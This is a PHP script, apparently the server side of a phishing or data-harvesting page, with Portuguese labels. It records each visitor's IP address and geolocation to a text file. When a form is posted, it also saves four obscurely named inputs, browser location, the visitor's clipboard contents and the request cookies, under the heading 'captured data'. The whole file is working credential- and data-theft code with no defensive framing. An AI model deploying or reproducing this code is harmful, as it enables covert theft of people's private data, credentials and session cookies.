<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

function getUserIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if ($header === 'HTTP_X_FORWARDED_FOR') {
                $ip_list = explode(',', $ip);
                $ip = trim($ip_list[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return 'IP não disponível';
}

function getIPInfo($ip) {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
    }
    $encoded_ip = urlencode($ip);
    $api_url = "http://ip-api.com/json/{$encoded_ip}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($response, true);
    return ($data && $data['status'] === 'success') ? [
        'city' => $data['city'] ?? 'Cidade desconhecida',
        'region' => $data['regionName'] ?? 'Região desconhecida',
        'country' => $data['country'] ?? 'País desconhecido'
    ] : ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
}

// Captura IP e localização
$ip = getUserIP();
$ipData = getIPInfo($ip);
$geoLocationIP = htmlspecialchars("{$ipData['city']}, {$ipData['region']}, {$ipData['country']}");

// Salva dados iniciais no mesmo diretório
$filePath = "dados.txt";
$file = fopen($filePath, "a");
fwrite($file, "+------------------------------------------------------------------------+\n");
fwrite($file, "|                         Cliente " . (file_exists($filePath) ? count(file($filePath)) / 10 + 1 : 1) . "                          |\n");
fwrite($file, "+------------------------------------------------------------------------+\n");
fwrite($file, "|  Dados capturados....                                                  |\n");
fwrite($file, "+------------------------------------------------------------------------+\n");
fwrite($file, "| IP: $ip                                                                |\n");
fwrite($file, "+------------------------------------------------------------------------+\n");
fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
fwrite($file, "+------------------------------------------------------------------------+\n\n");
fclose($file);

$feedback = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a1'])) {
    $a1 = htmlspecialchars($_POST['a1'] ?? 'N/A');
    $a2 = htmlspecialchars($_POST['a2'] ?? 'N/A');
    $a3 = htmlspecialchars($_POST['a3'] ?? 'N/A');
    $a4 = htmlspecialchars($_POST['a4'] ?? 'N/A');
    $location = htmlspecialchars($_POST['location'] ?? 'Localização não disponível');
    $clipboard = htmlspecialchars($_POST['clipboard'] ?? 'Nenhum texto da área de transferência');

    $file = fopen($filePath, "a");

    fwrite($file, "  Cliente " . (file_exists($filePath) ? count(file($filePath)) / 10 + 1 : 1) . "\n");
    fwrite($file, "  Dados capturados.... \n");
    fwrite($file, " Input 1: $a1  \n");
    fwrite($file, " Input 2: $a2  \n");
    fwrite($file, " Input 3: $a3  \n");
    fwrite($file, " Input 4: $a4 \n");
    fwrite($file, " IP: $ip \n");
    fwrite($file, " Localização (Navegador): $location  \n");
    fwrite($file, " Localização (IP): $geoLocationIP \n");
    fwrite($file, " Área de Transferência: $clipboard \n");
    fwrite($file, " Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
    fclose($file);
    $feedback = "<p style='color: green;' class='feedback'></p>";
}
?>
